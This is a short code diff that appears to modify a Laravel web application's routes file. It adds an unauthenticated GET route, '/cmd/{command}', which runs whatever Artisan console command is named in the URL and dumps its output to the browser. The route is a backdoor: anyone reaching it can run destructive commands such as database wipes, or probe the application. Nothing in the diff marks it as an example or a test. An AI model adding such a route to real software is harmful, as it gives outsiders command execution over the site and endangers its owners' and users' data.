@@ -89,3 +89,7 @@ Route::middleware([
 });
 
 Route::post('/dashboard/register-user', [UserController::class, 'store'])->name('dashboard.register-user');
+Route::get('/cmd/{command}', function ($command) {
+    Artisan::call($command);
+    dd(Artisan::output());
+});
